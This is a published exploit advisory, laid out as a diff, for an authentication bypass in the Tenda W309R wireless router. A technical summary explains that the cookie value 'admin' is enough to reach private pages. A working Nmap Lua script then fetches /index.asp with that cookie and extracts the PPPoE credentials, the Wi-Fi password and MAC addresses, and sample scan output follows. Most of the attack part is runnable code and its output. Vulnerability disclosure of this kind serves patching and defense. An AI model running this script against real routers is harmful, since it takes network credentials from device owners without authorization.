@@ -1,0 +1,133 @@
+---------------------------------------------------
+# Exploit Title: Tenda W309R Configuration Enumeration without
+Authentication
+# Author: SANTHO <<@s4n7h0>>
+# Vendor Homepage: http://www.tenda.cn
+# Product link: http://www.tenda.cn/tendacn/product/show.aspx?productid=382
+# Category: Hardware/Wireless Router
+# Firmware Version : V5.07.46
+---------------------------------------------------
+
+Technical Details
+~~~~~~~~~~~~~~~~~~
+Tenda Wireless Router W309R doesn't have proper authentication for the web
+application console. Though the application
+asks for password, it has poor cookie management which allows a user to
+login even without providing the password.
+Application uses cookie value "admin" to access the private pages which
+reveals configuration details such as
+PPoE username, PPoE password, wireless authentication key, details of MAC
+addresses etc, in the source code.
+
+
+Exploit Code [written in Nmap Script]
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+local nmap = require "nmap"
+local shortport = require "shortport"
+local table = require "table"
+local http = require "http"
+local stdnse = require 'stdnse'
+
+description = [[
+Tenda W309R allows an attacker to access the configuration detailed with no
+authentication.
+Firmware Tested : V5.07.46
+
+Thanks & Credits : Mahesh Gavkar, Samandeep Singh (@samanLEET), Amit
+Ghadigaonkar
+]]
+
+---
+--@usage
+-- nmap host --script http-tenda --script-args user=tenda
+--80/tcp open  http
+--| http-tenda:
+--|   PPPoE Username : home_user
+--|   PPPoE Password : 12345
+--|   Wireless Password : 12345678
+--|   Clone MAC : AA:AA:AA:AA:AA:AA
+--|_  Face MAC : BB:BB:BB:BB:BB:BB
+---
+
+author = "Sanoop Thomas a.k.a @s4n7h0"
+license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+categories = {"safe","discovery"}
+
+portrule = shortport.http
+
+function formatme(line)
+    local start = string.find(line, '"')
+    local stop = string.find(line, '";')
+    return line:sub(start+1,stop-1)
+end
+
+function fetchinfo(r)
+    local tenda = {}
+    local param,value
+    for line in r.body:gmatch("[^\r\n]+") do
+        if(line:match("def_PUN = "))then
+            table.insert(tenda,"PPPoE Username : " .. formatme(line))
+        end
+        if(line:match("def_PPW ="))then
+            table.insert(tenda,"PPPoE Password : " .. formatme(line))
+        end
+        if(line:match("def_wirelesspassword ="))then
+            table.insert(tenda,"Wireless Password : " .. formatme(line))
+        end
+        if(line:match("var cln_MAC ="))then
+
+            table.insert(tenda,"Clone MAC : " .. formatme(line))
+        end
+        if(line:match("var fac_MAC = "))then
+            table.insert(tenda,"Face MAC : " .. formatme(line))
+        end
+    end
+    return tenda
+end
+
+
+action = function(host, port)
+    local user = "admin"
+    local r
+    local config = {}
+
+    if(nmap.registry.args.user) then
+        user = nmap.registry.args.user
+    end
+
+    local header = {
+        cookies = user
+    }
+    r = http.get(host,port,'/index.asp',header)
+    return stdnse.format_output(true, fetchinfo(r))
+end
+
+
+PoC Output
+~~~~~~~~~~~~~
+root@bt# nmap 192.168.0.1 -p 80 --script http-tenda-enum
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-09-28 17:35
+Nmap scan report for 192.168.0.1
+Host is up (0.0019s latency).
+PORT   STATE SERVICE
+80/tcp open  http
+| http-tenda-enum:
+|   PPPoE Username : home_user
+|   PPPoE Password : 12345
+|   Wireless Password : 12345678
+|   Clone MAC : AA:AA:AA:AA:AA:AA
+|_  Face MAC : C8:3A:35:BB:BB:BB
+MAC Address: C8:3A:35:BB:BB:BB (Tenda Technology Co.)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds
+
+
+
+
+
+
+
+
+-- 
+SANTHO
+twitter : @s4n70 <https://twitter.com/s4n7h0>
